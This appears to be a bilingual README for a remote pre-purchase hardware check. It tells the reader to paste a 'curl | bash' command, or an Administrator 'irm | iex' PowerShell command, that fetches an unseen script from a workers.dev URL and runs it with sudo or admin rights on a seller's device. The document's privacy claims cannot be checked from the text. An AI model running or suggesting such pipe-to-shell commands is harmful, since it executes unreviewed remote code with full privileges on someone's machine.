# tirekicker

Pre-purchase remote check for AI hardware. One command. ~5–10 minutes. No installation.

---

## English

### What you need

1. The device **powered on** and connected to the **Internet** (Wi-Fi or cable).
2. **Good ventilation** — don't run this with the device in a closed bag or with the vents blocked.
3. **The device password** — you'll be asked once for "sudo".
4. About **5 to 10 minutes** total.
5. **Telegram open** — wait for the buyer's "go ahead" before paying.

### How to run it

Pick the line that matches the operating system on the device, paste it into a terminal window, press Enter. That's it.

**Linux** — open Terminal:

```bash
curl -fsSL https://tirekicker-relay.gentle-heart-33fd.workers.dev | bash
```

**Windows** — open PowerShell **as Administrator**:

```powershell
irm https://tirekicker-relay.gentle-heart-33fd.workers.dev/win | iex
```

You'll see steps appear on screen in English. When prompted, type the device password (it won't show as you type — that's normal). When it says **"Done"**, the report has been sent.

**Important — do not pay yet.** Stay at the seller's place until the buyer confirms on Telegram with **"go ahead, pay"**. Average wait: about 5 minutes per device.

### Photos to send (alongside the script)

Please also send 6 photos to the buyer on Telegram, one per device:

1. Device **front**
2. Device **back**
3. Device **bottom** (with label if visible)
4. **I/O panel** close-up (any port damage?)
5. **Power adapter label** — wattage must be readable
6. Device **serial sticker** (close, well-lit)

### What gets sent

Hardware info (CPU, GPU, RAM, disk, NVMe health), OS version, network info, and a short benchmark. **No personal files, no passwords, no browser data.** Serial numbers are hashed before sending.

---

## Español

### Lo que necesitas

1. El dispositivo **encendido** y conectado a **Internet** (Wi-Fi o cable).
2. **Buena ventilación** — no lo ejecutes con el equipo dentro de una bolsa cerrada o con las rejillas tapadas.
3. **La contraseña del dispositivo** — te la pedirá una vez para "sudo".
4. Unos **5 a 10 minutos** en total.
5. **Telegram abierto** — espera el "ok, paga" del comprador antes de pagar.

### Cómo ejecutarlo

Elige la línea que corresponda al sistema operativo del dispositivo, pégala en una ventana de terminal y pulsa Enter. Eso es todo.

**Linux** — abre el Terminal:

```bash
curl -fsSL https://tirekicker-relay.gentle-heart-33fd.workers.dev | bash
```

**Windows** — abre PowerShell **como Administrador**:

```powershell
irm https://tirekicker-relay.gentle-heart-33fd.workers.dev/win | iex
```

Verás los pasos en inglés en la pantalla. Cuando pida la contraseña del dispositivo, escríbela (no se ve mientras escribes, es normal). Cuando diga **"Done"**, el informe ha sido enviado.

**Importante — todavía no pagues.** Quédate en la tienda hasta que el comprador confirme por Telegram con **"ok, paga"**. Espera media: unos 5 minutos por dispositivo.

### Fotos que enviar (junto al script)

Por favor envía también 6 fotos por Telegram, una por dispositivo:

1. Dispositivo **frontal**
2. Dispositivo **trasero**
3. Dispositivo **parte inferior** (con etiqueta si la hay)
4. **Panel de puertos (I/O)** primer plano (¿daños en los puertos?)
5. **Etiqueta del adaptador de corriente** — vataje legible
6. **Pegatina de serie** del dispositivo (cerca, bien iluminada)

### Qué se envía

Información del hardware (CPU, GPU, RAM, disco, salud NVMe), versión del sistema, datos de red y una prueba breve de rendimiento. **Ningún archivo personal, ninguna contraseña, ningún dato de navegación.** Los números de serie se cifran (hash) antes de enviarse.
